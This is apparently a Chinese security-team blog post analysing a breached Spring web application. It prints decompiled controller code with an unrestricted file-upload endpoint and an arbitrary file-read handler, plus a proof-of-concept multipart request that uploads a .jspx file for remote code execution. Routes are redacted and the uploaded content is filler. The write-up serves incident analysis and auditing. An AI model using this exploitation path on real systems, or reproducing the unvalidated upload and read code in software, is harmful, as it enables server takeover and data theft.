#  某源码前台RCE漏洞分析   
 哈拉少安全小队   2024-12-19 03:21  
  
 一、前言  
  
    起因是一位师傅找我，大致意思是他们被上了webshell然后源码给我让我从中找出来他们用的什么0day让我给（抢了）研究研究。  
  
首先分析日志的时候发现。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhWM5RSfYlVibaBlVeJibgem1qzGurkH4ae5BSLErvhvE7V7JLG8HMKNtj06OVVNDfFtfvKOffqHD0ew/640?wx_fmt=png&from=appmsg "")  
  
存在很多这种文件，所以找到一个文件第一次出现的地方一般下一个POST请求即为漏洞的路径。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhWM5RSfYlVibaBlVeJibgem1q3THxplHhnpsFfdxkG7P9E2Llk2R8fuPricEaEx1C7ZiaLFTnq1q0PfpA/640?wx_fmt=png&from=appmsg "")  
  
二、前台任意文件上传  
  
  
      
定位到了相关的路由之后载入相关的jadx-gui进行分析，  
前提已经进行了分析，知道了这个源码使用的是SPring 开发的一个项目，直接全局搜索相关的路由。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhWM5RSfYlVibaBlVeJibgem1qjfvXLkUmH0HIv4zq94PrVfvYYGK9LOiaDic8ahHQlbYkQI9bnwsPeUMA/640?wx_fmt=png&from=appmsg "")  
  
搜索到两个相关的路径。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhWM5RSfYlVibaBlVeJibgem1q8GvH8628fEc4nYFlj8z3icJl86JZ0fAxw2zVhSDFhibibwuLItNVB39Mw/640?wx_fmt=png&from=appmsg "")  
  
其中一个位于PlugEditorUpImgController当中，另外一个位于User当中。  
  
在plug当中查看相关代码。  
  
```
    @RequestMapping({"xxxxxxx.do"})
    @ResponseBody
    public Map<String, String> ueditorUploadImage(@RequestParam("upfile") CommonsMultipartFile upfile, HttpServletRequest request) throws IOException {
        Map<String, String> map = new HashMap<>();
        if (upfile != null && upfile.getSize() > 0) {
            String extName = FileUtil.getFileExtName(upfile.getOriginalFilename());
            String url = XlyEnvironment.getInstance().getRealpath();
            String path = XlyEnvironment.getInstance().getXlyUploadDirConfig().getImgUeditor();
            String fileName = new Date().getTime() + "." + extName;
            String filePath = path + "/" + fileName;
            FileUtil.uploadFile(upfile, url + filePath);
            map.put("state", "SUCCESS");
            map.put("title", fileName);
            map.put("original", upfile.getOriginalFilename());
            map.put("type", "." + extName);
            map.put("url", filePath);
            map.put("size", upfile.getSize() + "");
        } else {
            map.put("state", "FALSE");
        }
        return map;
    }
}
```  
  
  
可以看到代码没有进行任何过滤直接进行了相关的上传导致的RCE。  
  
进行文件上传拿到文件名称然后直接进行了拼接，上传目录位于  
  
/plug/upload/imgUeditor/文件名称  
  
但是在User当中。  
```
    @RequestMapping({"xxxxx.do"})
    @ResponseBody
    public Map<String, String> ueditorUploadImage(@RequestParam("upfile") CommonsMultipartFile commonsMultipartFile, HttpServletRequest httpServletRequest) throws IOException {
        Map<String, String> hashMap = new HashMap<>();
        if (commonsMultipartFile != null && commonsMultipartFile.getSize() > 0) {
            String fileExtName = FileUtil.getFileExtName(commonsMultipartFile.getOriginalFilename());
            if (!CommonFun.validatorFileExtName(new String[]{"jpg", "jpeg", "gif", "bmp", "png"}, fileExtName)) {
                hashMap.put("state", "FALSE");
            } else {
                String realpath = XlyEnvironment.getInstance().getRealpath();
                String str = "ue" + DateUtil.dateTostr(new Date(), "yyyyMMdd") + "_" + DateUtil.getTimeMillis(new Date()) + "." + fileExtName;
                String str2 = XlyEnvironment.getInstance().getXlyUploadDirConfig().getImgUeditor() + "/" + str;
                FileUtil.uploadFile(commonsMultipartFile, realpath + str2);
                hashMap.put("state", "SUCCESS");
                hashMap.put("title", str);
                hashMap.put("original", commonsMultipartFile.getOriginalFilename());
                hashMap.put("type", "." + fileExtName);
                hashMap.put("url", str2);
                hashMap.put("size", commonsMultipartFile.getSize() + "");
            }
        } else {
            hashMap.put("state", "FALSE");
        }
        return hashMap;
    }
}
```  
  
存在了相关的白名单校验，校验相关的文件后缀名，不允许jsp等文件进行上传。  
  
那么我们只要触发相关的plug当中即可。  
  
相关数据包如下：  
  
需要触发plug下的方法  
```
POST /xxxxxxxx HTTP/1.1
Host: xxxxxxx
Content-Length: 315
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarym8BqwxWphEraUWuE
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarym8BqwxWphEraUWuE
Content-Disposition: form-data; name="upfile"; filename="1.jspx"
Content-Type: application/octet-stream

asddasaasddasaasddasaasddasaasddasaasddasaasddasaasddasaasddasaasddasaasddasaasddasaasddasaasddasaasddasaasddasaasddasa
------WebKitFormBoundarym8BqwxWphEraUWuE--
```  
  
直接上传相关文件造成任意文件上传RCE漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhWM5RSfYlVibaBlVeJibgem1qw9IBibFgOZFzhPfNa9libicVTk9dBicJtMqz22mTft06BfDQWeZvKQyBAQ/640?wx_fmt=png&from=appmsg "")  
  
直接进行了前台的文件上传。  
  
直接访问  
http://ip/x  
xxxxx/  
文件名称  
  
即可。  
  
  
三、任意文件读取漏洞  
  
在审计期间还找到了一个相关的任意文件读取漏洞，我们尝试进行分析  
  
相关payload为  
  
定位相关漏洞路由  
  
相关代码如下：  
```
    @RequestMapping({"/xxxxxxx.do"})
    public void plugFileDownAnnex_out(HttpServletRequest request, HttpServletResponse response) throws Exception {
        response.setContentType("application/msexcel");
        response.setHeader("Cache-Control", "no-cache");
        LoginUserSession.getLoginUserModel(request);
        String filePathName = request.getParameter("filePathName");
        if (filePathName.isEmpty()) {
            return;
        }
        String filePath = XlyEnvironment.getInstance().getRealpath() + filePathName;
        File file = new File(filePath);
        if (!file.exists()) {
            return;
        }
        String extName = FileUtil.getFileExtName(filePathName);
        response.setHeader("Content-Disposition", "attachment;filename = 1." + extName);
        OutputStream out = response.getOutputStream();
        try {
            try {
                InputStream in = new FileInputStream(filePath);
                byte[] buffer = new byte[1024];
                while (true) {
                    int len = in.read(buffer);
                    if (len > 0) {
                        out.write(buffer, 0, len);
                    } else {
                        in.close();
                        out.close();
                        return;
                    }
                }
            } catch (IOException e) {
                logger.error("下载附件时出错", e.getMessage());
                out.close();
            }
        } catch (Throwable th) {
            out.close();
            throw th;
        }
    }

```  
  
可以看出来使用IO流进行读取，直接就可以进行相关文件的读取。  
  
  
四、完结  
  
  
  
  
  
  
  
  
  
  
